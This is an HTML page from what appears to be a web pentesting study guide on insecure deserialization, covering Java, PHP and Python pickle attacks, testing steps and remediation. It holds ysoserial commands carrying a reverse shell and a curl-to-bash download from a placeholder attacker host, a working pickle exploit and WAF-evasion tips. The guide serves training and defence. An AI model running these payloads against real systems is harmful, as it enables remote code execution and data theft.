@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Insecure deserialization testing guide: gadget chain exploitation, ysoserial usage, and language-specific deserialization attacks.">
+    <meta property="og:title" content="Insecure Deserialization – Web App Pentesting Guide">
+    <meta property="og:description" content="Insecure deserialization testing guide: gadget chain exploitation, ysoserial usage, and language-specific deserialization attacks.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Insecure Deserialization  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Insecure Deserialization</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#how-it-works">How It Works</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#burp-workflow">Burp Workflow</a>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A08 · CVSS 9.8 · Day 4</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><line x1="16.5" y1="9.4" x2="7.5" y2="4.21"/><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/><polyline points="3.27 6.96 12 12.01 20.73 6.96"/><line x1="12" y1="22.08" x2="12" y2="12"/></svg></span><span>Insecure Deserialization</span></h1>
+      <p>Exploit unsafe object reconstruction to achieve remote code execution or privilege escalation by manipulating serialized data.</p>
+      <div class="badge-row">
+        <span class="badge badge-critical">Critical</span>
+        <span class="badge badge-bscp">BSCP Exam Topic</span>
+        <span class="badge badge-difficulty">Difficulty: Advanced</span>
+      </div>
+    </div>
+
+    <!-- ═══ ANALOGY ═══ -->
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">Sealed Envelopes and Blind Trust</div>
+        <p>A bank uses sealed envelopes to pass customer data between departments. The policy states: "Whatever is in a sealed envelope, process it immediately when opened ·don't verify the contents." One day, an attacker replaces a legitimate envelope with one containing forged instructions: "Empty the vault and send all money to this account." The bank opens the envelope and, following policy, executes the instructions without questioning them. Insecure deserialization is identical: the application deserializes (opens) untrusted serialized objects without validation, allowing an attacker to inject arbitrary instructions disguised as legitimate data.</p>
+      </div>
+    </section>
+
+    <!-- ═══ METHODOLOGY ═══ -->
+    <h2 id="methodology">📅 When in the 5-Day Workflow</h2>
+
+    <div class="workflow-days">
+      <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+      <div class="day-pill probe"><span class="day-num">Day 2</span>Identify Data</div>
+      <div class="day-pill"><span class="day-num">Day 3</span>File/CSRF</div>
+      <div class="day-pill deep"><span class="day-num">Day 4</span>Deep Dive</div>
+      <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+    </div>
+
+    <div class="callout method-probe">
+      <div class="callout-title">⚡ Day 2  · Identify Serialized Data</div>
+      <p>On Day 2, look through all cookies, hidden fields, and POST parameters for serialized data. Recognizing the format is the first step:</p>
+      <ul>
+        <li><strong>Java:</strong> Base64 starting with <code>rO0AB</code>, or raw bytes <code>\xac\xed\x00\x05</code></li>
+        <li><strong>PHP:</strong> looks like <code>O:4:"User":1:{s:4:"name";s:4:"test";}</code></li>
+        <li><strong>Python pickle:</strong> starts with <code>\x80\x04</code> or <code>\x80\x02</code></li>
+        <li><strong>.NET ViewState:</strong> base64 in hidden <code>__VIEWSTATE</code> field</li>
+      </ul>
+      <p>Mark any base64 cookie that decodes to binary/garbled text  · it might be a serialized object.</p>
+    </div>
+
+    <div class="callout method-deep">
+      <div class="callout-title">🎯 Day 4  · Deserialization Exploitation</div>
+      <p>Return to identified serialized data. For Java, use ysoserial to generate gadget chain payloads. Try multiple gadget chains  · the right one depends on which libraries are in the classpath:</p>
+      <pre><code># Java  · ysoserial (try multiple gadget chains)
+java -jar ysoserial.jar CommonsCollections1 'id' | base64
+java -jar ysoserial.jar CommonsCollections3 'id' | base64
+java -jar ysoserial.jar URLDNS 'http://YOUR.interactsh.com/' | base64
+
+# PHP  · phpggc
+phpggc Laravel/RCE1 system id | base64
+
+# Replace the original cookie/parameter value with the generated payload</code></pre>
+      <p>Start with the URLDNS gadget (just a DNS lookup) to confirm the endpoint is vulnerable before trying RCE gadgets. Use Burp Collaborator or interactsh to catch the DNS callback.</p>
+      <p><strong>Chain it:</strong> Deserialization RCE → reverse shell → read credentials → lateral movement to DB.</p>
+    </div>
+
+    <!-- ═══ HOW IT WORKS ═══ -->
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p><strong>Serialization</strong> converts objects into a stream of bytes or text for storage or transport. <strong>Deserialization</strong> reconstructs the original object from that stream. The vulnerability occurs when an attacker controls the serialized data and the application deserializes it without validation.</p>
+
+      <h3>Serialization Formats</h3>
+      <p>Different languages use different serialization formats:</p>
+      <ul>
+        <li><strong>Java:</strong> Binary serialized objects, recognizable by magic bytes <code>\xac\xed</code> or base64 prefix <code>rO0AB</code> when encoded</li>
+        <li><strong>PHP:</strong> String format: <code>O:4:"User":2:{s:4:"name";s:5:"Alice";s:3:"id";i:123;}</code></li>
+        <li><strong>Python:</strong> Pickle format, starts with <code>\x80\x04</code> (protocol 4) when binary</li>
+        <li><strong>Ruby:</strong> Marshal format, recognizable by version bytes</li>
+        <li><strong>.NET:</strong> Binary, JSON, or XML formats</li>
+      </ul>
+
+      <h3>Why Deserialization is Dangerous</h3>
+      <p>During deserialization, the application instantiates classes and calls special methods known as "magic methods":</p>
+      <ul>
+        <li><strong>Java:</strong> <code>readObject()</code> method is invoked automatically</li>
+        <li><strong>PHP:</strong> <code>__wakeup()</code> and <code>__destruct()</code> magic methods execute</li>
+        <li><strong>Python:</strong> <code>__reduce__()</code> and arbitrary code in pickle can be executed</li>
+      </ul>
+
+      <p>Attackers exploit these methods using gadget chains ·sequences of existing classes whose methods chain together to execute arbitrary code.</p>
+
+      <h3>Example  · Java Gadget Chain</h3>
+      <p>The CommonsCollections library contains classes that, when chained, can execute commands. If the application deserializes untrusted data and CommonsCollections is in the classpath, an attacker uses tools like <code>ysoserial</code> to generate a malicious serialized object that runs a command.</p>
+
+      <pre><code>// Attacker generates a gadget chain with ysoserial:
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash' | base64
+
+// This produces base64-encoded serialized data that, when deserialized, executes the command.</code></pre>
+
+      <h3>Example  · PHP Magic Method Exploitation</h3>
+      <p>In PHP, an attacker crafts serialized data that exploits magic methods:</p>
+      <pre><code>O:4:"User":2:{s:8:"username";s:5:"admin";s:3:"cmd";s:15:"whoami > /tmp/x";}
+
+// When deserialized, __destruct() is called and might execute 'cmd' if the class is vulnerable.</code></pre>
+    </section>
+
+    <!-- ═══ WHERE TO LOOK ═══ -->
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Serialized data appears in predictable places. Search for base64-encoded or binary data in:</p>
+
+      <h3>Common Locations</h3>
+      <ul>
+        <li><strong>Cookies:</strong> Session tokens, user preferences (look for base64 or magic bytes <code>rO0AB</code>)</li>
+        <li><strong>Hidden Form Fields:</strong> State data passed between pages</li>
+        <li><strong>HTTP Headers:</strong> Custom headers or Authorization tokens</li>
+        <li><strong>API Responses:</strong> JSON responses containing serialized objects as strings</li>
+        <li><strong>Cache Data:</strong> Redis or Memcached values that look encoded</li>
+        <li><strong>Database Columns:</strong> Fields storing serialized user data or preferences</li>
+      </ul>
+
+      <h3>Recognition Signs</h3>
+      <ul>
+        <li>Base64 strings that decode to binary garbage → likely serialized Java</li>
+        <li>Strings starting with <code>O:</code> with colons and quotes → PHP serialization</li>
+        <li>Data that looks structured (colons, semicolons, numbers) → serialized format</li>
+      </ul>
+    </section>
+
+    <!-- ═══ BURP WORKFLOW ═══ -->
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Identify Serialized Data</strong><br>
+          Use Burp's search function (Ctrl+F) or Proxy history to find base64-encoded strings or magic bytes. Look for <code>rO0AB</code> in cookies or parameters. Decode base64 and check for <code>\xac\xed</code> bytes (Java).
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Send to Repeater</strong><br>
+          Send the request containing serialized data to Repeater (Ctrl+R). Modify the serialized data and resend to observe behavior. Look for error messages that reveal class names.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Test with Gadget Chains</strong><br>
+          For Java: Use <code>ysoserial</code> to generate a malicious payload with a known gadget chain (CommonsCollections1, Spring, Spring2, etc.). URL-encode or base64-encode the output and replace the original serialized data.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Monitor for Execution</strong><br>
+          Send the payload and watch for outbound connections (DNS queries, HTTP requests) using a collaborator. If the command executes, you've achieved RCE.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>For PHP: Test Magic Methods</strong><br>
+          Craft serialized PHP data targeting <code>__destruct()</code> or <code>__wakeup()</code>. Modify class properties and resend. Check for file writes, command execution, or information disclosure.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Use Extensions</strong><br>
+          Install Burp's "Deserialization Scanner" or "Java Deserialization Scanner" extension for automated detection and payload generation.
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══ PAYLOADS ═══ -->
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Java Gadget Chain Payloads (ysoserial)</h3>
+      <p>Generate payloads using the <code>ysoserial</code> tool. First, identify which libraries are in the target's classpath by looking at error messages or source code.</p>
+
+      <pre><code>// CommonsCollections1 gadget chain (command execution)
+java -jar ysoserial.jar CommonsCollections1 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64 -w0
+
+// CommonsCollections5 (alternative chain)
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/shell.sh | bash' | base64 -w0
+
+// Spring gadget chain (if Spring is available)
+java -jar ysoserial.jar Spring1 'touch /tmp/pwned' | base64 -w0
+
+// ROME gadget chain
+java -jar ysoserial.jar ROME 'id > /tmp/output.txt' | base64 -w0</code></pre>
+
+      <p>Copy the base64 output, URL-encode it, and replace the original serialized data in a cookie or parameter.</p>
+
+      <h3>PHP Serialization Manipulation (phpggc)</h3>
+      <p>Use <code>phpggc</code> to generate PHP gadget chains, or craft manual serialized PHP data:</p>
+
+      <pre><code>// Using phpggc for Laravel:
+phpggc Laravel/RCE1 'system' 'whoami'
+
+// Manual PHP serialization targeting __destruct():
+O:12:"VulnerableClass":1:{s:7:"command";s:6:"whoami";}
+
+// Serialize a custom payload in Python:
+import pickle
+import base64
+# Create a payload (simplified ·real exploitation varies by library)
+payload = b"malicious_code"
+print(base64.b64encode(payload))</code></pre>
+
+      <h3>Python Pickle Exploitation</h3>
+      <p>Python's pickle module allows arbitrary code execution. Create a malicious pickle object:</p>
+
+      <pre><code>import pickle
+import os
+import base64
+
+# Define a class that executes code on unpickling
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('id > /tmp/pwned',))
+
+# Serialize and encode
+payload = pickle.dumps(Exploit())
+encoded = base64.b64encode(payload).decode()
+print(encoded)</code></pre>
+
+      <h3>Testing Techniques</h3>
+      <ul>
+        <li><strong>Collaborator Callbacks:</strong> Use Burp Collaborator to detect if a command executes (DNS/HTTP outbound connections)</li>
+        <li><strong>Time-based Detection:</strong> Use <code>sleep(5)</code> or <code>ping</code> commands to verify execution via response delay</li>
+        <li><strong>Output Capture:</strong> Redirect command output to a file on a writable location, then retrieve it via file read vulnerability</li>
+        <li><strong>Error Messages:</strong> Intentionally trigger errors (e.g., <code>cat /nonexistent</code>) to see error output in responses</li>
+      </ul>
+    </section>
+
+    <!-- ═══ CHECKLIST ═══ -->
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          <strong>Insecure Deserialization Tests</strong>
+          <span class="progress-mini"><span>0</span>/12</span>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c1">
+          <label for="c1">Search for base64-encoded or binary data in cookies, parameters, and headers</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c2">
+          <label for="c2">Identify serialization format (Java <code>rO0AB</code>, PHP <code>O:</code>, Python pickle, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c3">
+          <label for="c3">Decode base64 or hex-encoded data and inspect for magic bytes</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c4">
+          <label for="c4">Attempt simple payload modification (change visible strings, numbers) and observe behavior</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c5">
+          <label for="c5">For Java: Test CommonsCollections1, CommonsCollections5, Spring, and ROME gadget chains with ysoserial</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c6">
+          <label for="c6">For PHP: Identify class names in serialized data and research their magic methods</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c7">
+          <label for="c7">Test PHP payloads targeting <code>__destruct()</code> and <code>__wakeup()</code> methods</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c8">
+          <label for="c8">Use Burp Collaborator to detect outbound connections triggered by deserialization payloads</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c9">
+          <label for="c9">Test Python pickle payloads if the application deserializes pickle data</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c10">
+          <label for="c10">Document which gadget libraries are available (check error messages, source code, or dependencies)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c11">
+          <label for="c11">Attempt blind RCE using time-based techniques (sleep, delays) if output is not visible</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="c12">
+          <label for="c12">Test file write/read techniques to exfiltrate data if command execution occurs</label>
+        </div>
+        <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+      </div>
+    </section>
+
+    <!-- ═══ WAF BYPASS ═══ -->
+    <section id="waf-bypass">
+      <h2>WAF Bypass & Variations</h2>
+
+      <h3>Gadget Chain Rotation</h3>
+      <p>WAFs may block known gadget chains. Rotate between different chains available on the target:</p>
+      <ul>
+        <li><strong>CommonsCollections Variants:</strong> CommonsCollections1 through CommonsCollections7 use different method chains</li>
+        <li><strong>Spring Framework:</strong> Spring1, Spring2 if Spring libraries are present</li>
+        <li><strong>Custom Gadget Chains:</strong> Tools like <code>marshalsec</code> generate additional chains</li>
+      </ul>
+
+      <h3>Serialization Format Obfuscation</h3>
+      <ul>
+        <li><strong>Encoding Variations:</strong> Some applications accept URL-encoded, hex-encoded, or double-encoded serialized data</li>
+        <li><strong>Format Conversion:</strong> If the app accepts both Java and JSON, convert payload to JSON format for bypass</li>
+        <li><strong>Comment Injection:</strong> Add comments or dummy objects to serialized data to evade signature-based detection</li>
+      </ul>
+
+      <h3>Nested Deserialization</h3>
+      <p>Some applications deserialize multiple times. Wrap a payload in another layer of serialization to bypass single-layer detection.</p>
+
+      <h3>Alternative Exploitation Methods</h3>
+      <ul>
+        <li><strong>XXE Injection:</strong> If the app deserializes XML formats, exploit via XXE</li>
+        <li><strong>JNDI Injection:</strong> Java applications may be vulnerable to JNDI injection during deserialization</li>
+      </ul>
+    </section>
+
+    <!-- ═══ EXPLOITATION ═══ -->
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Exploitation Scenarios</h3>
+
+      <h4>Remote Code Execution (RCE)</h4>
+      <p>This is the primary risk. Once you craft a malicious serialized object, sending it to the application results in arbitrary command execution with the application's privileges.</p>
+
+      <h4>Account Takeover via Privilege Escalation</h4>
+      <p>Exploit magic methods to modify object properties (e.g., changing <code>isAdmin</code> to <code>true</code>). This is especially effective in PHP where serialized user objects are manipulated.</p>
+
+      <h4>Information Disclosure</h4>
+      <p>Use deserialization to instantiate classes that expose sensitive data or trigger error messages revealing file paths, class names, or system information.</p>
+
+      <h4>Denial of Service</h4>
+      <p>Craft gadget chains that consume excessive memory or CPU, causing the application to hang or crash.</p>
+
+      <h3>Impact</h3>
+      <ul>
+        <li><strong>Critical:</strong> Complete system compromise, data breach, malware installation</li>
+        <li><strong>High:</strong> Lateral movement, privilege escalation, unauthorized access</li>
+        <li><strong>Medium:</strong> Data exfiltration, DoS, defacement</li>
+      </ul>
+
+      <h3>Real-World Example: Java RCE via CommonsCollections</h3>
+      <p>A Java web application stores user preferences in a cookie using Java serialization. An attacker intercepts the cookie, uses ysoserial to generate a CommonsCollections gadget chain, and replaces the cookie value. When the application deserializes the cookie, the gadget chain executes, establishing a reverse shell to the attacker's server.</p>
+    </section>
+
+    <!-- ═══ REMEDIATION ═══ -->
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>Primary: Avoid Deserializing Untrusted Data</h3>
+      <p>The best fix is never to deserialize untrusted data. If you must deserialize:</p>
+
+      <h3>Use Safe Serialization Formats</h3>
+      <ul>
+        <li><strong>JSON with Schema Validation:</strong> Use JSON instead of binary serialization. Validate against a strict schema.</li>
+        <li><strong>Protocol Buffers or MessagePack:</strong> These formats are safer and don't execute code during deserialization.</li>
+      </ul>
+
+      <h3>Implement Integrity Checks</h3>
+      <p>Sign serialized data with an HMAC or digital signature:</p>
+      <pre><code>// Pseudocode: Sign serialized data
+byte[] serialized = serialize(object);
+byte[] hmac = hmac(SECRET_KEY, serialized);
+// Send: serialized + hmac
+
+// On deserialization:
+if (!hmac(SECRET_KEY, serialized).equals(receivedHmac)) {
+  throw new SecurityException("Data tampered");
+}
+Object obj = deserialize(serialized);</code></pre>
+
+      <h3>Use Allowlist-based Deserialization</h3>
+      <p>Configure the deserialization mechanism to only accept whitelisted classes:</p>
+      <pre><code>// Java example using ObjectInputFilter (Java 9+)
+ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
+  "java.base/*;!*"
+);
+ois.setObjectInputFilter(filter);</code></pre>
+
+      <h3>Keep Dependencies Updated</h3>
+      <ul>
+        <li>Patch all libraries to their latest versions (CommonsCollections, Spring, etc.)</li>
+        <li>Regularly scan dependencies for known gadget chains</li>
+      </ul>
+
+      <h3>Network Segmentation</h3>
+      <p>Run the application in a restricted environment with limited outbound access to reduce the impact of RCE.</p>
+
+      <h3>Disable Unnecessary Gadget Libraries</h3>
+      <p>Remove unused libraries from the classpath (e.g., don't include CommonsCollections if it's not needed).</p>
+    </section>
+
+    <!-- ═══ LABS ═══ -->
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>PortSwigger Web Security Academy includes approximately 10 deserialization labs covering Java, PHP, and various gadget chains:</p>
+      <ul>
+        <li>Arbitrary class instantiation in PHP deserialization</li>
+        <li>Exploiting Java deserialization with CommonsCollections</li>
+        <li>Exploiting Java deserialization with Spring</li>
+        <li>Exploiting gadget chains in custom classes</li>
+        <li>JNDI injection via deserialization</li>
+        <li>Deserialization-based authentication bypass</li>
+        <li>Exploiting PHP magic methods</li>
+      </ul>
+      <p>Work through these labs to practice identifying serialized data, generating gadget chains, and crafting payloads. Focus on understanding how magic methods and gadget chains chain together to achieve RCE.</p>
+    </section>
+
+    <!-- ═══ COMMON MISTAKES ═══ -->
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <h3>Not Recognizing Serialized Data</h3>
+      <p><strong>Mistake:</strong> Assuming base64-encoded strings are just encoded user data, not serialized objects.</p>
+      <p><strong>Fix:</strong> Decode base64 and look for magic bytes (<code>\xac\xed</code> for Java, <code>O:</code> for PHP). Test all encoded data found in cookies and parameters.</p>
+
+      <h3>Using Only One Gadget Library</h3>
+      <p><strong>Mistake:</strong> Generating only CommonsCollections payloads and assuming that's the only gadget chain available.</p>
+      <p><strong>Fix:</strong> Enumerate all libraries in the target's classpath. Generate payloads for multiple gadget chains (CommonsCollections, Spring, ROME, etc.) and test each.</p>
+
+      <h3>Ignoring PHP Magic Methods</h3>
+      <p><strong>Mistake:</strong> Focusing only on Java exploitation and overlooking PHP deserialization via magic methods.</p>
+      <p><strong>Fix:</strong> Learn PHP magic methods (<code>__wakeup</code>, <code>__destruct</code>, <code>__toString</code>). Test PHP serialized data by crafting payloads that exploit these methods.</p>
+
+      <h3>Not Using Correct Encoding**</h3>
+      <p><strong>Mistake:</strong> Generating a ysoserial payload but not base64-encoding it before inserting it into a cookie.</p>
+      <p><strong>Fix:</strong> Always match the original encoding format. If the original was base64, base64-encode the payload. If it was hex, hex-encode it.</p>
+
+      <h3>Forgetting to URL-Encode**</h3>
+      <p><strong>Mistake:</strong> Pasting a base64 payload directly into a URL parameter without URL-encoding special characters.</p>
+      <p><strong>Fix:</strong> URL-encode the entire payload before inserting it into parameters.</p>
+
+      <h3>No Monitoring for Blind Execution**</h3>
+      <p><strong>Mistake:</strong> Testing a payload but not monitoring outbound connections or time delays to detect execution.</p>
+      <p><strong>Fix:</strong> Always use Burp Collaborator to detect DNS/HTTP callbacks, or use time-based detection (sleep commands) when output is not visible.</p>
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>Insecure deserialization is rarely found alone  · look for these entry points and amplifiers.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="ssti.html"><span class="sa-icon">📝</span><span class="sa-name">SSTI</span><span class="sa-why">Both achieve RCE through code execution. Apps with deserialization issues often have template injection too.</span></a>
+      <a class="see-also-card" href="ssrf.html"><span class="sa-icon">📡</span><span class="sa-name">SSRF</span><span class="sa-why">SSRF → internal Redis/memcached → inject serialized payload → deserialization RCE on backend processes.</span></a>
+      <a class="see-also-card" href="file-upload.html"><span class="sa-icon">📂</span><span class="sa-name">File Upload</span><span class="sa-why">Upload a serialized object disguised as a file → server deserializes it on processing → RCE.</span></a>
+      <a class="see-also-card" href="race-conditions.html"><span class="sa-icon">⏱️</span><span class="sa-name">Race Conditions</span><span class="sa-why">Race to inject a serialized payload during a brief window when the server trusts unsanitized user data.</span></a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) document.querySelectorAll('#sidebar a').forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+document.querySelectorAll('[id]').forEach(s => observer.observe(s));
+const SK = 'deserialization-cl-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  if (localStorage.getItem(SK+i) === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(SK+i, cb.checked);
+    cb.closest('.checklist-item').classList.toggle('done', cb.checked);
+    updateProgress();
+  });
+});
+function updateProgress() {
+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
